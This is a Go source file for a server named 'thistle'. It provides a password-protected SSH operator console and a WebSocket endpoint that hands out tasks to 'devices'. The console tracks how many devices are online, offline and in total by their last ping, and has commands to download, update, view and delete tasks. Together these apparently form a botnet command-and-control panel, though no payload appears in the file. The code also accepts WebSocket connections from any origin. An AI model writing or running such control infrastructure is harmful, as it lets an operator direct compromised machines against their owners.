package main

import (
	"database/sql"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/ssh"
)

type User struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

var (
	authorizedPasswords = make(map[string]string)
	db                  *sql.DB
)

// handleConnections handles incoming WebSocket connections
func handleWebsocketConnections(w http.ResponseWriter, r *http.Request) {
	// Upgrade initial GET request to a WebSocket
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Fatalf("Failed to upgrade connection: %v", err)
		return
	}
	defer ws.Close()

	// Continuously read messages from the WebSocket
	for {
		_, msg, err := ws.ReadMessage()
		if err != nil {
			log.Printf("Error reading message: %v", err)
			break
		}
		log.Printf("Received message: %s", msg)
		// Echo the message back
		if err := ws.WriteMessage(websocket.TextMessage, getTask(string(msg))); err != nil {
			log.Printf("Error writing message: %v", err)
			break
		}
	}
}

func handleConnection(conn net.Conn, config *ssh.ServerConfig) {
	sshConn, chans, reqs, err := ssh.NewServerConn(conn, config)
	if err != nil {
		log.Println("Failed to create SSH connection:", err)
		return
	}
	defer sshConn.Close()

	go ssh.DiscardRequests(reqs)
	for ch := range chans {
		go handleChannel(ch, sshConn.User())
	}
}

func handleChannel(ch ssh.NewChannel, username string) {
	db.Exec("UPDATE devices SET status = 'offline' WHERE lastping < strftime('%s', 'now') - 30")
	if ch.ChannelType() != "session" {
		ch.Reject(ssh.UnknownChannelType, "unknown channel type")
		return
	}

	channel, _, err := ch.Accept()
	if err != nil {
		log.Println("Failed to accept channel:", err)
		return
	}
	defer channel.Close()
	clearTerminal(channel)
	startLoadingAnimation(channel)
	clearTerminal(channel)
	fmt.Fprint(channel, getRandomQuote())
	time.Sleep(1500 * time.Millisecond)
	online, offline, total := GetCounts()
	fmt.Fprintf(channel, "\033]0;thistle - Total ["+total+"] Online ["+online+"] Offline ["+offline+"].\007")
	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				online, offline, total := GetCounts()
				fmt.Fprintf(channel, "\033]0;thistle - Total ["+total+"] Online ["+online+"] Offline ["+offline+"].\007")
			}
		}
	}()
	displayMenu(channel)
	commandLoop(channel, username)
}

func commandLoop(channel ssh.Channel, username string) {
	for {
		displayPrompt(channel, username)
		buf := make([]byte, 1024)
		n, err := channel.Read(buf)
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Println("Failed to read from channel:", err)
			break
		}
		command := strings.TrimSpace(string(buf[:n]))

		if command == "exit" {
			break
		}

		switch {
		case command == ".help":
			clearTerminal(channel)
			displayMenu(channel)
		case command == ".download":
			clearTerminal(channel)
			download(channel)
		case command == ".update":
			clearTerminal(channel)
			update(channel)
		case command == ".viewtasks":
			clearTerminal(channel)
			viewtasks(channel)
		case command == ".deletetask":
			clearTerminal(channel)
			deletetask(channel)
		case command == ".viewstats":
			clearTerminal(channel)
			viewstats(channel)
		default:
			fmt.Fprintln(channel, "Unknown command. Type '.help' for a list of commands.")
		}
	}
}

func startServer() {
	http.HandleFunc("/thistle", handleWebsocketConnections)
	http.HandleFunc("/hello", helloHandler)

	// Start the server on localhost port 8080 and log any errors
	log.Println("WebSocket server started on :56019")
	err := http.ListenAndServeTLS("127.0.0.1:56019", "server.crt", "server.key", nil)
	if err != nil {
		log.Fatalf("ListenAndServeTLS: %v", err)
	}
}

func helloHandler(w http.ResponseWriter, r *http.Request) {
	// Send "Hello, World!" response
	fmt.Fprintln(w, "Hello, World!")
}

func main() {
	dbFileName := "thistle.db"

	// Check if the file exists
	if _, err := os.Stat(dbFileName); os.IsNotExist(err) {
		// File does not exist, create the database and schema
		fmt.Println("Database file does not exist. Creating new database...")
		createDatabase(dbFileName)
	} else {
		fmt.Println("Database file exists.")
	}

	// You can now open and use the database
	sqliteDatabase, _ := sql.Open("sqlite3", "./thistle.db?_journal_mode=WAL")
	db = sqliteDatabase
	privateKeyFile := "private.key"
	privateKey, err := loadPrivateKey(privateKeyFile)
	if err != nil {
		log.Fatalf("Failed to load private key: %v", err)
	}

	usersFile := "users.json"
	if err := loadUsers(usersFile); err != nil {
		log.Fatalf("Failed to load users: %v", err)
	}

	config := &ssh.ServerConfig{
		NoClientAuth: false,
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			if checkPassword(c.User(), string(pass)) {
				return nil, nil
			}
			return nil, fmt.Errorf("invalid password")
		},
	}
	config.AddHostKey(privateKey)
	go startServer()

	listener, err := net.Listen("tcp", ":2222")
	if err != nil {
		log.Fatalf("Failed to listen on port 2222: %v", err)
	}

	log.Println("Listening on port 2222...")
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Failed to accept connection:", err)
			continue
		}
		go handleConnection(conn, config)
	}
}
